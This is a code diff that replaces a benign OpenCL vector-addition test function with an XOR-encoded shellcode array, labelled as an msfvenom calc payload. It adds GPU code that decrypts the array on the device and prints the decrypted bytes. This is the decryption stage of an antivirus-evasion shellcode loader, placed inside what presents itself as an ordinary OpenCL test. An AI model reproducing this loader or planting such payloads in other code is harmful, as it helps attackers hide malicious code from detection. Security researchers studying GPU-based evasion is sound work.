@@ -1,129 +1,107 @@
 #include "../../include/vanilla/main_webgpu.h"
 
 int cltest(){
-const char *source = 
-    "#if defined(cl_khr_fp64)\n"
-    "#  pragma OPENCL EXTENSION cl_khr_fp64: enable\n"
-    "#elif defined(cl_amd_fp64)\n"
-    "#  pragma OPENCL EXTENSION cl_amd_fp64: enable\n"
-    "#else\n"
-    "#  error double precision is not supported\n"
-    "#endif\n"
-    "kernel void add(\n"
-    "         ulong n,\n"
-    "       global const double *a,\n"
-    "       global const double *b,\n"
-    "       global double *c\n"
-    "       )\n"
-    "{\n"
-    "    size_t i = get_global_id(0);\n"
-    "    if (i < n) {\n"
-    "       c[i] = a[i] + b[i];\n"
-    "    }\n"
-    "}\n";
-	
 
-  const size_t N = 1 << 20;
+    // fc 48 ... msfvenom calc payload
+    unsigned char buf[] = "\x97\x23\xe8\x8f\x9b\x83\xab\x6b\x6b\x6b\x2a\x3a\x2a\x3b\x39\x3a\x3d\x23\x5a\xb9\x0e\x23\xe0\x39\x0b\x23\xe0\x39\x73\x23\xe0\x39\x4b\x23\xe0\x19\x3b\x23\x64\xdc\x21\x21\x26\x5a\xa2\x23\x5a\xab\xc7\x57\x0a\x17\x69\x47\x4b\x2a\xaa\xa2\x66\x2a\x6a\xaa\x89\x86\x39\x2a\x3a\x23\xe0\x39\x4b\xe0\x29\x57\x23\x6a\xbb\xe0\xeb\xe3\x6b\x6b\x6b\x23\xee\xab\x1f\x0c\x23\x6a\xbb\x3b\xe0\x23\x73\x2f\xe0\x2b\x4b\x22\x6a\xbb\x88\x3d\x23\x94\xa2\x2a\xe0\x5f\xe3\x23\x6a\xbd\x26\x5a\xa2\x23\x5a\xab\xc7\x2a\xaa\xa2\x66\x2a\x6a\xaa\x53\x8b\x1e\x9a\x27\x68\x27\x4f\x63\x2e\x52\xba\x1e\xb3\x33\x2f\xe0\x2b\x4f\x22\x6a\xbb\x0d\x2a\xe0\x67\x23\x2f\xe0\x2b\x77\x22\x6a\xbb\x2a\xe0\x6f\xe3\x23\x6a\xbb\x2a\x33\x2a\x33\x35\x32\x31\x2a\x33\x2a\x32\x2a\x31\x23\xe8\x87\x4b\x2a\x39\x94\x8b\x33\x2a\x32\x31\x23\xe0\x79\x82\x3c\x94\x94\x94\x36\x23\xd1\x6a\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x23\xe6\xe6\x6a\x6a\x6b\x6b\x2a\xd1\x5a\xe0\x04\xec\x94\xbe\xd0\x9b\xde\xc9\x3d\x2a\xd1\xcd\xfe\xd6\xf6\x94\xbe\x23\xe8\xaf\x43\x57\x6d\x17\x61\xeb\x90\x8b\x1e\x6e\xd0\x2c\x78\x19\x04\x01\x6b\x32\x2a\xe2\xb1\x94\xbe\x08\x0a\x07\x08\x45\x0e\x13\x0e\x6b\x6b";
 
- //   try {
-	// Get list of OpenCL platforms.
-	std::vector<cl::Platform> platform;
-	cl::Platform::get(&platform);
+    unsigned char key[] = "k";
 
-	if (platform.empty()) {
-	    std::cerr << "OpenCL platforms not found." << std::endl;
-	    return 1;
-	}
+    char finalPayload[SHELLCODE_LENGTH] = { 0 };
 
-	// Get first available GPU device which supports double precision.
-	cl::Context context;
-	std::vector<cl::Device> device;
-	for(auto p = platform.begin(); device.empty() && p != platform.end(); p++) {
-	    std::vector<cl::Device> pldev;
+    size_t dataSize = SHELLCODE_LENGTH;
 
-	    try {
-		p->getDevices(CL_DEVICE_TYPE_GPU, &pldev);
+    //get all platforms (drivers)
+    std::vector<cl::Platform> all_platforms;
+    cl::Platform::get(&all_platforms);
+    if (all_platforms.size() == 0)
+    {
+        std::cout << " No platforms found. Check OpenCL installation!\n";
+        exit(1);
+    }
+    cl::Platform default_platform = all_platforms[0];
+    std::cout << "Using platform: " << default_platform.getInfo<CL_PLATFORM_NAME>() << "\n";
 
-		for(auto d = pldev.begin(); device.empty() && d != pldev.end(); d++) {
-		    if (!d->getInfo<CL_DEVICE_AVAILABLE>()) continue;
+    //get default device of the default platform
+    std::vector<cl::Device> all_devices;
+    default_platform.getDevices(CL_DEVICE_TYPE_ALL, &all_devices);
+    if (all_devices.size() == 0) 
+    {
+        std::cout << " No devices found. Check OpenCL installation!\n";
+        exit(1);
+    }
+    cl::Device default_device = all_devices[0];
+    std::cout << "Using device: " << default_device.getInfo<CL_DEVICE_NAME>() << "\n";
 
-		    std::string ext = d->getInfo<CL_DEVICE_EXTENSIONS>();
+    // Setup OpenCL
+    cl::Context context({ default_device });
+    cl_int err;
+    cl_command_queue queue = clCreateCommandQueueWithProperties(context.get(), default_device.get(), NULL, &err);   
 
-		    if (
-			    ext.find("cl_khr_fp64") == std::string::npos &&
-			    ext.find("cl_amd_fp64") == std::string::npos
-		       ) continue;
+    // setup buffers
+    cl_mem shellcodeEncrypted = clCreateBuffer(context.get(), CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR, dataSize, buf, &err);
+    cl_mem xorKey = clCreateBuffer(context.get(), CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR, sizeof(char), key, &err);
+    cl_mem shellcodeDecryptedOut = clCreateBuffer(context.get(), CL_MEM_READ_WRITE, dataSize, NULL, &err);
 
-		    device.push_back(*d);
-		    context = cl::Context(device);
-		}
-	    } catch(...) {
-		device.clear();
-	    }
-	}
+    // Create kernel from source
+    cl_program kernel = clCreateProgramWithSource(context.get(), 1, xorKernelSource, NULL, &err);
+    if (err)
+    {
+        std::cout << "clCreateProgramWithSource: " << getErrorString(err) << std::endl;
+    }
+    cl_int res = clBuildProgram(kernel, 0, NULL, NULL, NULL, NULL);
+    if (res != CL_BUILD_SUCCESS)
+    {
+        size_t len = 0;
+        clGetProgramBuildInfo(kernel, default_device.get(), CL_PROGRAM_BUILD_LOG, 0, NULL, &len);
+        char* buffer = (char*)malloc(len * sizeof(char));
+        clGetProgramBuildInfo(kernel, default_device.get(), CL_PROGRAM_BUILD_LOG, len, buffer, NULL);
+        std::cout << buffer << std::endl;
+        free(buffer);
+    }
 
-	if (device.empty()) {
-	    std::cerr << "GPUs with double precision not found." << std::endl;
-	    return 1;
-	}
+    // Get a handle to the kernel function for decryption
+    cl_kernel decryptKernelFunctionHandle = clCreateKernel(kernel, "decrypt", &err);
+    if (err)
+    {
+        std::cout << "clCreateKernel: " << getErrorString(err) << std::endl;
+    }
 
-	std::cout << device[0].getInfo<CL_DEVICE_NAME>() << std::endl;
+    // Set arguments for kernel
+    clSetKernelArg(decryptKernelFunctionHandle, 0, sizeof(cl_mem), (void*)&shellcodeEncrypted);
+    clSetKernelArg(decryptKernelFunctionHandle, 1, sizeof(cl_mem), (void*)&xorKey);
+    clSetKernelArg(decryptKernelFunctionHandle, 2, sizeof(cl_mem), (void*)&shellcodeDecryptedOut);
 
-	// Create command queue.
-	cl::CommandQueue queue(context, device[0]);
+    // Launch the kernel on the GPU with one work item per byte
+    size_t workSize = SHELLCODE_LENGTH;
+    err = clEnqueueNDRangeKernel(queue, decryptKernelFunctionHandle, 1, NULL, &workSize, NULL, 0, NULL, NULL);
+    if (err)
+    {
+        std::cout << "clEnqueueNDRangeKernel: " << getErrorString(err) << std::endl;
+    }
 
-	// Compile OpenCL program for found device.
-	cl::Program program(context,source,NULL);
+    // Copy the output from GPU memory back to CPU memory
+    err = clEnqueueReadBuffer(queue, shellcodeDecryptedOut, CL_TRUE, 0, dataSize, finalPayload, 0, NULL, NULL);
+    if (err)
+    {
+        std::cout << "clEnqueueReadBuffer: " << getErrorString(err) << std::endl;
+    }
 
-//	try {
-	    program.build(device);
-//	} catch (const cl::Error&) {
-//	    std::cerr
-//		<< "OpenCL compilation error" << std::endl
-//		<< program.getBuildInfo<CL_PROGRAM_BUILD_LOG>(device[0])
-//		<< std::endl;
-//	    return 1;
-//	}
+    // Print decrypted payload
+    for (int i=0; i < SHELLCODE_LENGTH; i++)
+    {
+        printf("\\x%02x", (char)finalPayload[i]);
+    }
 
-	cl::Kernel add(program, "add");
+    // Cleanup
+    clReleaseKernel(decryptKernelFunctionHandle);
+    clReleaseProgram(kernel);
+    clReleaseCommandQueue(queue);
+    clReleaseContext(context.get());
+    clReleaseMemObject(shellcodeEncrypted);
+    clReleaseMemObject(xorKey);
+    clReleaseMemObject(shellcodeDecryptedOut);
 
-	// Prepare input data.
-	std::vector<double> a(N, 1);
-	std::vector<double> b(N, 2);
-	std::vector<double> c(N);
-
-	// Allocate device buffers and transfer input data to device.
-	cl::Buffer A(context, CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR,
-		a.size() * sizeof(double), a.data());
-
-	cl::Buffer B(context, CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR,
-		b.size() * sizeof(double), b.data());
-
-	cl::Buffer C(context, CL_MEM_READ_WRITE,
-		c.size() * sizeof(double));
-
-	// Set kernel parameters.
-	add.setArg(0, static_cast<cl_ulong>(N));
-	add.setArg(1, A);
-	add.setArg(2, B);
-	add.setArg(3, C);
-	
-	// Launch kernel on the compute device.
-	queue.enqueueNDRangeKernel(add, cl::NullRange, N, cl::NullRange);
-
-	// Get result back to host.
-	queue.enqueueReadBuffer(C, CL_TRUE, 0, c.size() * sizeof(double), c.data());
-
-	// Should get '3' here.
-	std::cout << c[42] << std::endl;
-  //  } catch (const cl::Error &err) {
-//	std::cerr
-//	    << "OpenCL error: "
-//	    << err.what() << "(" << err.err() << ")"
-//	    << std::endl;
-//	return 1;
- //   }
-    
 return 0;
 }
 
